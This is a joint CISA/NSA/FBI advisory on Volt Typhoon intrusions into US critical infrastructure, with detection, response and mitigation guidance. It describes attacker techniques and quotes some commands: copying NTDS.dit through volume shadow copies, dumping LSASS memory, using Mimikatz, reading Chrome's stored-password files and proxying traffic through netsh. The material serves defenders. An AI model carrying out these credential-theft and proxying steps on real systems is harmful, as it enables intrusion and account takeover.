For additional information, see joint advisory People’s Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection and U.S. Department of Justice (DOJ) press release U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure. For more information on PRC state-sponsored malicious cyber activity, see CISA’s China Cyber Threat Overview and Advisories webpage.
Download the PDF version of this report:


AA24-038A PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure
(PDF,       1.56 MB
  )


Read the accompanying Malware Analysis Report: MAR-10448362-1.v1 Volt Typhoon.
For a downloadable copy of indicators of compromise (IOCs), see:


MAR-10448362.c1.v2.CLEAR_stix2.json
(JSON,       51.99 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See Appendix C: MITRE ATT&CK Tactics and Techniques section for tables of the Volt Typhoon cyber threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview of Activity
In May 2023, the authoring agencies—working with industry partners—disclosed information about activity attributed to Volt Typhoon (see joint advisory People’s Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection). Since then, CISA, NSA, and FBI have determined that this activity is part of a broader campaign in which Volt Typhoon actors have successfully infiltrated the networks of critical infrastructure organizations in the continental and non-continental United States and its territories, including Guam.
The U.S. authoring agencies have primarily observed compromises linked to Volt Typhoon in Communications, Energy, Transportation Systems, and Water and Wastewater Systems sector organizations’ IT networks. Some victims are smaller organizations with limited cybersecurity capabilities that provide critical services to larger organizations or key geographic locations.
Volt Typhoon actors tailor their TTPs to the victim environment; however, the U.S. authoring agencies have observed the actors typically following the same pattern of behavior across identified intrusions. Their choice of targets and pattern of behavior is not consistent with traditional cyber espionage or intelligence gathering operations, and the U.S. authoring agencies assess with high confidence that Volt Typhoon actors are pre-positioning themselves on IT networks to enable the disruption of OT functions across multiple critical infrastructure sectors (see Figure 1).

Volt Typhoon conducts extensive pre-compromise reconnaissance to learn about the target organization’s network architecture and operational protocols. This reconnaissance includes identifying network topologies, security measures, typical user behaviors, and key network and IT staff. The intelligence gathered by Volt Typhoon actors is likely leveraged to enhance their operational security. For example, in some instances, Volt Typhoon actors may have abstained from using compromised credentials outside of normal working hours to avoid triggering security alerts on abnormal account activities.
Volt Typhoon typically gains initial access to the IT network by exploiting known or zero-day vulnerabilities in public-facing network appliances (e.g., routers, virtual private networks,VPNs, and firewalls) and then connects to the victim’s network via VPN for follow-on activities.
Volt Typhoon aims to obtain administrator credentials within the network, often by exploiting privilege escalation vulnerabilities in the operating system or network services. In some cases, Volt Typhoon has obtained credentials insecurely stored on a public-facing network appliance.
Volt Typhoon uses valid administrator credentials to move laterally to the domain controller (DC) and other devices via remote access services such as Remote Desktop Protocol (RDP).
Volt Typhoon conducts discovery in the victim’s network, leveraging LOTL binaries for stealth. A key tactic includes using PowerShell to perform targeted queries on Windows event logs, focusing on specific users and periods. These queries facilitate the discreet extraction of security event logs into .dat files, allowing Volt Typhoon actors to gather critical information while minimizing detection. This strategy, blending in-depth pre-compromise reconnaissance with meticulous post-exploitation intelligence collection, underscores their sophisticated and strategic approach to cyber operations.
Volt Typhoon achieves full domain compromise by extracting the Active Directory database (NTDS.dit) from the DC. Volt Typhoon frequently employs the Volume Shadow Copy Service (VSS) using command-line utilities such as vssadmin to access NTDS.dit. The NTDS.dit file is a centralized repository that contains critical Active Directory data, including user accounts, passwords (in hashed form), and other sensitive data, which can be leveraged for further exploitation. This method entails the creation of a shadow copy—a point-in-time snapshot—of the volume hosting the NTDS.dit file. By leveraging this snapshot, Volt Typhoon actors effectively bypass the file locking mechanisms inherent in a live Windows environment, which typically prevent direct access to the NTDS.dit file while the domain controller is operational.
Volt Typhoon likely uses offline password cracking techniques to decipher these hashes. This process involves extracting the hashes from the NTDS.dit file and then applying various password cracking methods, such as brute force attacks, dictionary attacks, or more sophisticated techniques like rainbow tables to uncover the plaintext passwords. The successful decryption of these passwords allows Volt Typhoon actors to obtain elevated access and further infiltrate and manipulate the network.
Volt Typhoon uses elevated credentials for strategic network infiltration and additional discovery, often focusing on gaining capabilities to access OT assets. Volt Typhoon actors have been observed testing access to domain-joint OT assets using default OT vendor credentials, and in certain instances, they have possessed the capability to access OT systems whose credentials were compromised via NTDS.dit theft. This access enables potential disruptions, such as manipulating heating, ventilation, and air conditioning (HVAC) systems in server rooms or disrupting critical energy and water controls, leading to significant infrastructure failures (in some cases, Volt Typhoon actors had the capability to access camera surveillance systems at critical infrastructure facilities). In one confirmed compromise, Volt Typhoon actors moved laterally to a control system and were positioned to move to a second control system.


 

Figure 1: Typical Volt Typhoon Activity

After successfully gaining access to legitimate accounts, Volt Typhoon actors exhibit minimal activity within the compromised environment (except discovery as noted above), suggesting their objective is to maintain persistence rather than immediate exploitation. This assessment is supported by observed patterns where Volt Typhoon methodically re-targets the same organizations over extended periods, often spanning several years, to continuously validate and potentially enhance their unauthorized accesses. Evidence of their meticulous approach is seen in instances where they repeatedly exfiltrate domain credentials, ensuring access to current and valid accounts. For example, in one compromise, Volt Typhoon likely extracted NTDS.dit from three domain controllers in a four-year period. In another compromise, Volt Typhoon actors extracted NTDS.dit two times from a victim in a nine-month period.
Industry reporting—identifying that Volt Typhoon actors are silent on the network following credential dumping and perform discovery to learn about the environment, but do not exfiltrate data—is consistent with the U.S. authoring agencies’ observations. This indicates their aim is to achieve and maintain persistence on the network. In one confirmed compromise, an industry partner observed Volt Typhoon actors dumping credentials at regular intervals.
In addition to leveraging stolen account credentials, the actors use LOTL techniques and avoid leaving malware artifacts on systems that would cause alerts. Their strong focus on stealth and operational security allows them to maintain long-term, undiscovered persistence. Further, Volt Typhoon’s operational security is enhanced by targeted log deletion to conceal their actions within the compromised environment.
See the below sections for Volt Typhoon TTPs observed by the U.S. authoring agencies from multiple confirmed Volt Typhoon compromises.
Observed TTPs
Reconnaissance
Volt Typhoon actors conduct extensive pre-compromise reconnaissance, to learn about the target organization, its network, and its staff,. This includes web searches,—including victim-owned sites,—for victim host, identity, and network information, especially for information on key network and IT administrators. According to industry reporting, Volt Typhoon actors use FOFA,1, Shodan, and Censys for querying or searching for exposed infrastructure. In some instances, the U.S. authoring agencies have observed Volt Typhoon actors targeting the personal emails of key network and IT staff, post compromise.
Resource Development
Historically, Volt Typhoon actors use multi-hop proxies for command and control (C2) infrastructure,. The proxy is typically composed of virtual private servers (VPSs), or small office/home office (SOHO) routers. Recently, Volt Typhoon actors used Cisco and NETGEAR end-of-life SOHO routers implanted with KV Botnet malware to support their operations,. (See DOJ press release U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure for more information).
Initial Access
To obtain initial access, Volt Typhoon actors commonly exploit vulnerabilities in networking appliances such as those from Fortinet, Ivanti Connect Secure (formerly Pulse Secure), NETGEAR, Citrix, and Cisco,. They often use publicly available exploit code for known vulnerabilities, but are also adept at discovering and exploiting zero-day vulnerabilities,.

In one confirmed compromise, Volt Typhoon actors likely obtained initial access by exploiting CVE-2022-42475 in a network perimeter FortiGate 300D firewall that was not patched. There is evidence of a buffer overflow attack identified within the Secure Sockets Layer (SSL)-VPN crash logs.

Once initial access is achieved, Volt Typhoon actors typically shift to establishing persistent access,. They often use VPN sessions to securely connect to victim environments, enabling discreet follow-on intrusion activities. This tactic not only provides a stable foothold in the network but also allows them to blend in with regular traffic, significantly reducing their chances of detection.
Execution
Volt Typhoon actors rarely use malware for post-compromise execution. Instead, once Volt Typhoon actors gain access to target environments, they use hands-on-keyboard activity via the command-line, and other native tools and processes on systems, (often referred to as “LOLBins”), known as LOTL, to maintain and expand access to the victim networks. According to industry reporting, some “commands appear to be exploratory or experimental, as the operators,i.e., malicious actors, adjust and repeat them multiple times.”,2,
For more details on LOTL activity, see the Credential Access and Discovery sections and Appendix A: Volt Typhoon LOTL Activity.
Similar to LOTL, Volt Typhoon actors also use legitimate but outdated versions of network admin tools. For example, in one confirmed compromise, actors downloaded, an outdated version of comsvcs.dll on the DC in a non-standard folder. comsvcs.dll is a legitimate Microsoft Dynamic Link Library (DLL) file normally found in the System32 folder. The actors used this DLL with MiniDump and the process ID of the Local Security Authority Subsystem Service (LSASS) to dump the LSASS process memory, and obtain credentials (LSASS process memory space contains hashes for the current user’s operating system (OS) credentials).
The actors also use legitimate non-native network admin and forensic tools. For example, Volt Typhoon actors have been observed using Magnet RAM Capture (MRC) version 1.20 on domain controllers. MRC is a free imaging tool that captures the physical memory of a computer, and Volt Typhoon actors likely used it to analyze in-memory data for sensitive information (such as credentials) and in-transit data not typically accessible on disk. Volt Typhoon actors have also been observed implanting Fast Reverse Proxy (FRP) for command and control.,3, (See the Command and Control section).
Persistence
Volt Typhoon primarily relies on valid credentials for persistence,.
Defense Evasion
Volt Typhoon has strong operational security. Their actors primarily use LOTL for defense evasion, which allows them to camouflage their malicious activity with typical system and network behavior, potentially circumventing simplistic endpoint security capabilities. For more information, see joint guide Identifying and Mitigating Living off the Land Techniques.
Volt Typhoon actors also obfuscate their malware. In one confirmed compromise, Volt Typhoon obfuscated FRP client files (BrightmetricAgent.exe and SMSvcService.exe) and the command-line port scanning utility ScanLine by packing the files with Ultimate Packer for Executables (UPX),. FRP client applications support encryption, compression, and easy token authentication and work across multiple protocols—including transmission control protocol (TCP), user datagram protocol (UDP), hypertext transfer protocol (HTTP), and hypertext transfer protocol secure (HTTPS). The FRP client applications use the Kuai connection protocol (KCP) for error-checked and anonymous data stream delivery over UDP, with packet-level encryption support. See Appendix C and CISA Malware Analysis Report (MAR)-10448362-1.v1 for more information.
In addition to LOTL and obfuscation techniques, Volt Typhoon actors have been observed selectively clearing Windows Event Logs, system logs, and other technical artifacts to remove evidence, of their intrusion activity and masquerading file names,.
Credential Access
Volt Typhoon actors first obtain credentials from public-facing appliances after gaining initial access by exploiting privilege escalation vulnerabilities, in the operating system or network services. In some cases, they have obtained credentials insecurely stored on the appliance,. In one instance, where Volt Typhoon likely exploited CVE-2022-42475 in an unpatched Fortinet device, Volt Typhoon actors compromised a domain admin account stored inappropriately on the device.
Volt Typhoon also consistently obtains valid credentials by extracting the Active Directory database file (NTDS.dit)—in some cases multiple times from the same victim over long periods,. NTDS.dit contains usernames, hashed passwords, and group memberships for all domain accounts, essentially allowing for full domain compromise if the hashes can be cracked offline.
To obtain NTDS.dit, the U.S. authoring agencies have observed Volt Typhoon:

Move laterally, to the domain controller via an interactive RDP session using a compromised account with domain administrator privileges,;
Execute the Windows-native vssadmin, command to create a volume shadow copy;
Use Windows Management Instrumentation Console (WMIC) commands, to execute ntdsutil (a LOTL utility) to copy NTDS.dit and SYSTEM registry hive from the volume shadow copy; and
Exfiltrate, NTDS.dit and SYSTEM registry hive to crack passwords offline),. (For more details, including specific commands used, see Appendix A: Volt Typhoon LOTL Activity.)Note: A volume shadow copy contains a copy of all the files and folders that exist on the specified volume. Each volume shadow copy created on a DC includes its NTDS.dit and the SYSTEM registry hive, which provides keys to decrypt the NTDS.dit file.

Volt Typhoon actors have also been observed interacting with a PuTTY application by enumerating existing stored sessions,. Given this interaction and the exposure of cleartext-stored proxy passwords used in remote administration, Volt Typhoon actors potentially had access to PuTTY profiles that allow access to critical systems (see the Lateral Movement section).
According to industry reporting, Volt Typhoon actors attempted to dump credentials through LSASS (see Appendix B for commands used).,2,
The U.S. authoring agencies have observed Volt Typhoon actors leveraging Mimikatz to harvest credentials, and industry partners have observed Volt Typhoon leveraging Impacket.,2,

Mimikatz is a credential dumping tool and Volt Typhoon actors use it to obtain credentials. In one confirmed compromise, the Volt Typhoon used RDP to connect to a server and run Mimikatz after leveraging a compromised administrator account to deploy it.
Impacket is an open source Python toolkit for programmatically constructing and manipulating network protocols. It contains tools for Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks—as well as remote service execution.

Discovery
Volt Typhoon actors have been observed using commercial tools, LOTL utilities, and appliances already present on the system for system information, network service, group, and user, discovery.
Volt Typhoon uses at least the following LOTL tools and commands for system information, network service, group, and user discovery techniques:

Some observed specific examples of discovery include:

Capturing successful logon events,.

Specifically, in one incident, analysis of the PowerShell console history of a domain controller indicated that security event logs were directed to a file named user.dat, as evidenced by the executed command Get-EventLog security -instanceid 4624 -after,year-month-date, | fl * | Out-File 'C:\users\public\documents\user.dat'. This indicates the group's specific interest in capturing successful logon events (event ID 4624) to analyze user authentication patterns within the network. Additionally, file system analysis, specifically of the Master File Table (MFT), uncovered evidence of a separate file, systeminfo.dat, which was created in C:\Users\Public\Documents but subsequently deleted,. The presence of these activities suggests a methodical approach by Volt Typhoon actors in collecting and then possibly removing traces of sensitive log information from the compromised system.


Executing tasklist /v to gather a detailed process listing, followed by executing taskkill /f /im rdpservice.exe (the function of this executable is not known).
Executing net user and quser for user account information,.
Creating and accessing a file named rult3uil.log on a domain controller in C:\Windows\System32\. The rult3uil.log file contained user activities on a compromised system, showcasing a combination of window title information, and focus shifts, keypresses, and command executions across Google Chrome and Windows PowerShell, with corresponding timestamps.
Employing ping with various IP addresses to check network connectivity, and net start to list running services,.

See Appendix A for additional LOTL examples.
In one confirmed compromise, Volt Typhoon actors attempted to use Advanced IP Scanner, which was on the network for admin use, to scan the network.
Volt Typhoon actors have been observed strategically targeting network administrator web browser data—focusing on both browsing history and stored credentials,—to facilitate targeting of personal email addresses (see the Reconnaissance section) for further discovery and possible network modifications that may impact the threat actor’s persistence within victim networks.
In one confirmed compromise:

Volt Typhoon actors obtained the history file from the User Data directory of a network administrator user’s Chrome browser. To obtain the history file, Volt Typhoon actors first executed an RDP session to the user’s workstation where they initially attempted, and failed, to obtain the C$ File Name: users\{redacted}\appdata\local\Google\Chrome\UserData\default\History file, as evidenced by the accompanying 1016 (reopen failed) SMB error listed in the application event log. The threat actors then disconnected the RDP session to the workstation and accessed the file C:\Users\{redacted}\Downloads\History.zip. This file presumably contained data from the User Data directory of the user’s Chrome browser, which the actors likely saved in the Downloads directory for exfiltration,. Shortly after accessing the history.zip file, the actors terminated RDP sessions.
About four months later, Volt Typhoon actors accessed the same user’s Chrome data C$ File Name: Users\{redacted}\AppData\Local\Google\Chrome\User Data\Local State and $ File Name: Users\{redacted}\AppData\Local\Google\Chrome\User Data\Default\Login Data via SMB. The Local State file contains the Advanced Encryption Standard (AES) encryption key, used to encrypt the passwords stored in the Chrome browser, which would enable the actors to obtain plaintext passwords stored in the Login Data file in the Chrome browser.

In another confirmed compromise, Volt Typhoon actors accessed directories containing Chrome and Edge user data on multiple systems. Directory interaction was observed over the network to paths such as C:\Users\{redacted}\AppData\Local\Google\Chrome\User Data\ and C:\Users\{redacted}\AppData\Local\Microsoft\Edge\User Data\. They also enumerated several directories, including directories containing vulnerability testing and cyber related content and facilities data, such as construction drawings,.
Lateral Movement
For lateral movement, Volt Typhoon actors have been observed predominantly employing RDP with compromised valid administrator credentials. Note: With a full on-premises Microsoft Active Directory identity compromise (see the Credential Access section), the group may be capable of using other methods such as Pass the Hash or Pass the Ticket for lateral movement,.
In one confirmed compromise of a Water and Wastewater Systems Sector entity, after obtaining initial access, Volt Typhoon actors connected to the network via a VPN with administrator credentials they obtained and opened an RDP session with the same credentials to move laterally. Over a nine-month period, they moved laterally to a file server, a domain controller, an Oracle Management Server (OMS), and a VMware vCenter server. The actors obtained domain credentials from the domain controller and performed discovery, collection, and exfiltration on the file server (see the Discovery and Collection and Exfiltration sections).
Volt Typhoon’s movement to the vCenter server was likely strategic for pre-positioning to OT assets. The vCenter server was adjacent to OT assets, and Volt Typhoon actors were observed interacting with the PuTTY application on the server by enumerating existing stored sessions. With this information, Volt Typhoon potentially had access to a range of critical PuTTY profiles, including those for water treatment plants, water wells, an electrical substation, OT systems, and network security devices. This would enable them to access these critical systems,. See Figure 2.

 

Figure 2: Volt Typhoon Lateral Movement Path File Server, DC, and OT-Adjacent Assets

Additionally, Volt Typhoon actors have been observed using PSExec to execute remote processes, including the automated acceptance of the end-user license agreement (EULA) through an administrative account, signified by the accepteula command flag.
Volt Typhoon actors may have attempted to move laterally to a cloud environment in one victim’s network but direct attribution to the Volt Typhoon group was inconclusive. During the period of the their known network presence, there were anomalous login attempts to an Azure tenant, potentially using credentials, previously compromised from theft of NTDS.dit. These attempts, coupled with misconfigured virtual machines with open RDP ports, suggested a potential for cloud-based lateral movement. However, subsequent investigations, including password changes and multifactor authentication (MFA) implementations, revealed authentication failures from non-associated IP addresses, with no definitive link to Volt Typhoon.
Collection and Exfiltration
The U.S. authoring agencies assess Volt Typhoon primarily collects information that would facilitate follow-on actions with physical impacts. For example, in one confirmed compromise, they collected, sensitive information obtained from a file server in multiple zipped files, and likely exfiltrated, the files via Server Message Block (SMB), (see Figure 3). Collected information included diagrams and documentation related to OT equipment, including supervisory control and data acquisition (SCADA) systems, relays, and switchgear. This data is crucial for understanding and potentially impacting critical infrastructure systems, indicating a focus on gathering intelligence that could be leveraged in actions targeting physical assets and systems.

 

Figure 3: Volt Typhoon Attack Path for Exfiltration of Data from File Server

In another compromise, Volt Typhoon actors leveraged WMIC to create and use temporary directories (C:\Users\Public\pro, C:\Windows\Temp\tmp, C:\Windows\Temp\tmp\Active Directory and C:\Windows\Temp\tmp\registry) to stage the extracted ntds.dit and SYSTEM registry hives from ntdsutil execution volume shadow copies (see the Credential Access section) obtained from two DCs. They then compressed and archived the extracted ntds.dit and accompanying registry files by executing ronf.exe, which was likely a renamed version of the archive utility rar.exe),.
Command and Control
Volt Typhoon actors have been observed leveraging compromised SOHO routers and virtual private servers (VPS) to proxy C2 traffic. For more information, see DOJ press release U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure).
They have also been observed setting up FRP clients, on a victim’s corporate infrastructure to establish covert communications channels, for command and control. In one instance, Volt Typhoon actors implanted the FRP client with filename SMSvcService.exe on a Shortel Enterprise Contact Center (ECC) server and a second FRP client with filename Brightmetricagent.exe on another server. These clients, when executed via PowerShell, open reverse proxies between the compromised system and Volt Typhoon C2 servers. Brightmetricagent.exe has additional capabilities. The FRP client can locate servers behind a network firewall or obscured through Network Address Translation (NAT),. It also contains multiplexer libraries that can bi-directionally stream data over NAT networks and contains a command-line interface (CLI) library that can leverage command shells such as PowerShell, Windows Management Instrumentation (WMI), and Z Shell (zsh),. See Appendix C and MAR-10448362-1.v1 for more information.
In the same compromise, Volt Typhoon actors exploited a Paessler Router Traffic Grapher (PRTG) server as an intermediary for their FRP operations. To facilitate this, they used the netsh command, a legitimate Windows command, to create a PortProxy registry modification, on the PRTG server,. This key alteration redirected specific port traffic to Volt Typhoon’s proxy infrastructure, effectively converting the PRTG’s server into a proxy for their C2 traffic, (see Appendix B for details).
DETECTION/HUNT RECOMMENDATIONS
Apply Living off the Land Detection Best Practices
Apply the prioritized detection and hardening best practice recommendations provided in joint guide Identifying and Mitigating Living off the Land Techniques. Many organizations lack security and network management best practices (such as established baselines) that support detection of malicious LOTL activity—this makes it difficult for network defenders to discern legitimate behavior from malicious behavior and conduct behavior analytics, anomaly detection, and proactive hunting. Conventional IOCs associated with the malicious activity are generally lacking, complicating network defenders’ efforts to identify, track, and categorize this sort of malicious behavior. This advisory provides guidance for a multifaceted cybersecurity strategy that enables behavior analytics, anomaly detection, and proactive hunting, which are part of a comprehensive approach to mitigating cyber threats that employ LOTL techniques.
Review Application, Security, and System Event Logs
Routinely review application, security, and system event logs, focusing on Windows Extensible Storage Engine Technology (ESENT) Application Logs. Due to Volt Typhoon’s ability for long-term undetected persistence, network defenders should assume significant dwell time and review specific application event log IDs, which remain on endpoints for longer periods compared to security event logs and other ephemeral artifacts. Focus on Windows ESENT logs because certain ESENT Application Log event IDs (216, 325, 326, and 327) may indicate actors copying NTDS.dit.
See Table 1 for examples of ESENT and other key log indicators that should be investigated. Please note that incidents may not always have exact matches listed in the Event Detail column due to variations in event logging and TTPs.

Monitor and Review OT System Logs

Review access logs for communication paths between IT and OT networks, looking for anomalous accesses or protocols.
Measure the baseline of normal operations and network traffic for the industrial control system (ICS) and assess traffic anomalies for malicious activity.
Configure intrusion detection systems (IDS) to create alarms for any ICS network traffic outside normal operations.
Track and monitor audit trails on critical areas of ICS.
Set up security incident and event monitoring (SIEM) to monitor, analyze, and correlate event logs from across the ICS network to identify intrusion attempts.

Review CISA’s Recommended Cybersecurity Practices for Industrial Control Systems and the joint advisory, NSA and CISA Recommend Immediate Actions to Reduce Exposure Across all Operational Technologies and Control Systems, for further OT system detection and mitigation guidance.
Use gait to Detect Possible Network Proxy Activities
Use gait,4, to detect network proxy activities. Developed by Sandia National Labs, gait is a publicly available Zeek,5, extension. The gait extension can help enrich Zeek’s network connection monitoring and SSL logs by including additional metadata in the logs. Specifically, gait captures unique TCP options and timing data such as a TCP, transport layer security (TLS), and Secure Shell (SSH) layer inferred round trip times (RTT), aiding in the identification of the software used by both endpoints and intermediaries.
While the gait extension for Zeek is an effective tool for enriching network monitoring logs with detailed metadata, it is not specifically designed to detect Volt Typhoon actor activities. The extension’s capabilities extend to general anomaly detection in network traffic, including—but not limited to—proxying activities. Therefore, while gait can be helpful in identifying tactics similar to those used by Volt Typhoon, such as proxy networks and FRP clients for C2 communication, not all proxying activities detected by using this additional metadata are necessarily indicative of Volt Typhoon presence. It serves as a valuable augmentation to current security stacks for a broader spectrum of threat detection.
For more information, see Sandia National Lab’s gait GitHub page sandialabs/gait: Zeek Extension to Collect Metadata for Profiling of Endpoints and Proxies.
Review Logins for Impossible Travel
Examine VPN or other account logon times, frequency, duration, and locations. Logons from two geographically distant locations within a short timeframe from a single user may indicate an account is being used maliciously. Logons of unusual frequency or duration may indicate a threat actor attempting to access a system repeatedly or maintain prolonged sessions for the purpose of data extraction.
Review Standard Directories for Unusual Files
Review directories, such as C:\windows\temp\ and C:\users\public\, for unexpected or unusual files. Monitor these temporary file storage directories for files typically located in standard system paths, such as the System32 directory. For example, Volt Typhoon has been observed downloading comsvcs.dll to a non-standard folder (this file is normally found in the System32 folder).
INCIDENT RESPONSE
If compromise, or potential compromise, is detected, organizations should assume full domain compromise because of Volt Typhoon’s known behavioral pattern of extracting the NTDS.dit from the DCs. Organizations should immediately implement the following immediate, defensive countermeasures:

Sever the enterprise network from the internet. Note: this step requires the agency to understand its internal and external connections. When making the decision to sever internet access, knowledge of connections must be combined with care to avoid disrupting critical functions.

If you cannot sever from the internet, shutdown all non-essential traffic between the affected enterprise network and the internet.


Reset credentials of privileged and non-privileged accounts within the trust boundary of each compromised account.

Reset passwords for all domain users and all local accounts, such as Guest, HelpAssistant, DefaultAccount, System, Administrator, and krbtgt. The krbtgt account is responsible for handling Kerberos ticket requests as well as encrypting and signing them. The krbtgt account should be reset twice because the account has a two-password history. The first account reset for the krbtgt needs to be allowed to replicate prior to the second reset to avoid any issues. See CISA’s Eviction Guidance for Networks Affected by the SolarWinds and Active Directory/M365 Compromise for more information. Although tailored to FCEB agencies compromised in the 2020 SolarWinds Orion supply chain compromise, the steps are applicable to organizations with Windows AD compromise.

Review access policies to temporarily revoke privileges/access for affected accounts/devices. If it is necessary to not alert the attacker (e.g., for intelligence purposes), then privileges can be reduced for affected accounts/devices to “contain” them.


Reset the relevant account credentials or access keys if the investigation finds the threat actor’s access is limited to non-elevated permissions.

Monitor related accounts, especially administrative accounts, for any further signs of unauthorized access.




Audit all network appliance and edge device configurations with indicators of malicious activity for signs of unauthorized or malicious configuration changes. Organizations should ensure they audit the current network device running configuration and any local configurations that could be loaded at boot time. If configuration changes are identified:

Change all credentials being used to manage network devices, to include keys and strings used to secure network device functions (SNMP strings/user credentials, IPsec/IKE preshared keys, routing secrets, TACACS/RADIUS secrets, RSA keys/certificates, etc.).
Update all firmware and software to the latest version.


Report the compromise to an authoring agency (see the Contact Information section).
For organizations with cloud or hybrid environments, apply best practices for identity and credential access management. 

Verify that all accounts with privileged role assignments are cloud native, not synced from Active Directory.
Audit conditional access policies to ensure Global Administrators and other highly privileged service principals and accounts are not exempted.
Audit privileged role assignments to ensure adherence to the principle of least privilege when assigning privileged roles.
Leverage just-in-time and just-enough access mechanisms when administrators need to elevate to a privileged role.
In hybrid environments, ensure federated systems (such as AD FS) are configured and monitored properly.
Audit Enterprise Applications for recently added applications and examine the API permissions assigned to each.


Reconnect to the internet. Note: The decision to reconnect to the internet depends on senior leadership’s confidence in the actions taken. It is possible—depending on the environment—that new information discovered during pre-eviction and eviction steps could add additional eviction tasks.
Minimize and control use of remote access tools and protocols by applying best practices from joint Guide to Securing Remote Access Software and joint Cybersecurity Information Sheet: Keeping PowerShell: Security Measures to Use and Embrace.
Consider sharing technical information with an authoring agency and/or a sector-specific information sharing and analysis center.

For more information on incident response and remediation, see:

Joint advisory Technical Approaches to Uncovering and Remediating Malicious Activity. This advisory provides incident response best practices.
CISA’s Federal Government Cybersecurity Incident and Vulnerability Response Playbooks. Although tailored to U.S. Federal Civilian Executive Branch (FCEB) agencies, the playbooks are applicable to all organizations. The incident response playbook provides procedures to identify, coordinate, remediate, recover, and track successful mitigations from incidents.
Joint Water and Wastewater Sector - Incident Response Guide. This joint guide provides incident response best practices and information on federal resources for Water and Wastewater Systems Sector organizations.

MITIGATIONS
These mitigations are intended for IT administrators in critical infrastructure organizations. The authoring agencies recommend that software manufactures incorporate secure by design and default principles and tactics into their software development practices to strengthen the security posture for their customers.
For information on secure by design practices that may protect customers against common Volt Typhoon techniques, see joint guide Identifying and Mitigating Living off the Land Techniques and joint Secure by Design Alert Security Design Improvements for SOHO Device Manufacturers.
For more information on secure by design, see CISA’s Secure by Design webpage and joint guide.
The authoring agencies recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture on the basis of Volt Typhoon activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
IT Network Administrators and Defenders
Harden the Attack Surface

Apply patches for internet-facing systems within a risk-informed span of time,CPG 1E,. Prioritize patching critical assets, known exploited vulnerabilities, and vulnerabilities in appliances known to be frequently exploited by Volt Typhoon (e.g., Fortinet, Ivanti, NETGEAR, Citrix, and Cisco devices).
Apply vendor-provided or industry standard hardening guidance to strengthen software and system configurations. Note: As part of CISA’s Secure by Design campaign, CISA urges software manufacturers to prioritize secure by default configurations to eliminate the need for customer implementation of hardening guidelines.
Maintain and regularly update an inventory of all organizational IT assets,CPG 1A,.
Use third party assessments to validate current system and network security compliance via security architecture reviews, penetration tests, bug bounties, attack surface management services, incident simulations, or table-top exercises (both announced and unannounced),CPG 1F,.
Limit internet exposure of systems when not necessary. An organization’s primary attack surface is the combination of the exposure of all its internet-facing systems. Decrease the attack surface by not exposing systems or management interfaces to the internet when not necessary.
Plan “end of life” for technology beyond manufacturer supported lifecycle. Inventories of organizational assets should be leveraged in patch and configuration management as noted above. Inventories will also enable identification of technology beyond the manufacturer’s supported lifecycle. Where technology is beyond “end of life” or “end of support,” additional cybersecurity vigilance is necessary, and may warrant one or more of the following:

Supplemental support agreements;
Additional scanning and testing;
Configuration changes;
Isolation;
Segmentation; and
Development of forward-looking plans to facilitate replacement.



Secure Credentials

Do not store credentials on edge appliances/devices. Ensure edge devices do not contain accounts that could provide domain admin access.
Do not store plaintext credentials on any system,CPG 2L,. Credentials should be stored securely—such as with a credential/password manager or vault, or other privileged account management solutions—so they can only be accessed by authenticated and authorized users.
Change default passwords,CPG 2A, and ensure they meet the policy requirements for complexity.
Implement and enforce an organizational system-enforced policy that:

Requires passwords for all IT password-protected assets to be at least 15 characters;
Does not allow users to reuse passwords for accounts, applications, services, etc.,CPG 2C,; and
Does not allow service accounts/machine accounts to reuse passwords from member user accounts.


Configure Group Policy settings to prevent web browsers from saving passwords and disable autofill functions.
Disable the storage of clear text passwords in LSASS memory.

Secure Accounts

Implement phishing-resistant MFA for access to assets,CPG 2H,.
Separate user and privileged accounts.

User accounts should never have administrator or super-user privileges,CPG 2E,.
Administrators should never use administrator accounts for actions and activities not associated with the administrator role (e.g., checking email, web browsing).


Enforce the principle of least privilege.

Ensure administrator accounts only have the minimum permissions necessary to complete their tasks.
Review account permissions for default/accounts for edge appliances/devices and remove domain administrator privileges, if identified.
Significantly limit the number of users with elevated privileges. Implement continuous monitoring for changes in group membership, especially in privileged groups, to detect and respond to unauthorized modifications.
Remove accounts from high-privilege groups like Enterprise Admins and Schema Admins. Temporarily reinstate these privileges only when necessary and under strict auditing to reduce the risk of privilege abuse.
Transition to Group Managed Service Accounts (gMSAs) where suitable for enhanced management and security of service account credentials. gMSAs provide automated password management and simplified Service Principal Name (SPN) management, enhancing security over traditional service accounts. See Microsoft’s Group Managed Service Accounts Overview.


Enforce strict policies via Group Policy and User Rights Assignments to limit high-privilege service accounts.
Consider using a privileged access management (PAM) solution to manage access to privileged accounts and resources,CPG 2L,. PAM solutions can also log and alert usage to detect any unusual activity.
Complement the PAM solution with role-based access control (RBAC) for tailored access based on job requirements. This ensures that elevated access is granted only when required and for a limited duration, minimizing the window of opportunity for abuse or exploitation of privileged credentials.
Implement an Active Directory tiering model to segregate administrative accounts based on their access level and associated risk. This approach reduces the potential impact of a compromised account. See Microsoft’s PAM environment tier model.
Harden administrative workstations to only permit administrative activities from workstations appropriately hardened based on the administrative tier. See Microsoft’s Why are privileged access devices important - Privileged access.
Disable all user accounts and access to organizational resources of employees on the day of their departure,CPG 2G,
Regularly audit all user, admin, and service accounts and remove or disable unused or unneeded accounts as applicable.
Regularly roll NTLM hashes of accounts that support token-based authentication.
